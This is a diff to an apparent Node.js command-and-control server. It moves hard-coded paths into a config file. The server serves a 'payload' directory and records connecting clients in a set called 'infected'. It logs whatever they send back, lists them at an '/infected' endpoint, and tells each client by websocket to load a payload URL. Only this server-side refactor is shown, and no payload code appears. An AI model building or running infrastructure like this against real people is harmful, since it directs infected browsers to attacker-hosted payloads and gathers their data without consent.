@@ -1,19 +1,19 @@
+const config = require('../config')
 const express = require('express')
 const express_ws = require('express-ws')
 const path = require('path')
 
 const app = express()
-
 express_ws(app)
 
-// TODO make this path configurable
-app.use('/payload', express.static(path.join(__dirname, '..', 'payload')))
+app.use(config.payloadpath, express.static(path.join(__dirname, '..', 'payload')))
 
 const infected = new Set()
-app.ws('/ws/:id', (ws, wsreq) => {
+app.ws(config.wspath + '/:id', (ws, wsreq) => {
     infected.add(wsreq.params.id)
 
     ws.on('message', (msg) => {
+        // TODO write to a file
         console.log(JSON.stringify(msg))
     })
 
@@ -23,7 +23,8 @@ app.ws('/ws/:id', (ws, wsreq) => {
         res.end('hi')
     })
 
-    ws.send(JSON.stringify({url:'http://localhost:8080/payload/test.html'}))
+    let targeturl = 'http://' + config.url + ':' + config.port + config.payloadpath + '/test.html'
+    ws.send(JSON.stringify({url:targeturl}))
 })
 
 app.get('/infected', (req, res) => {
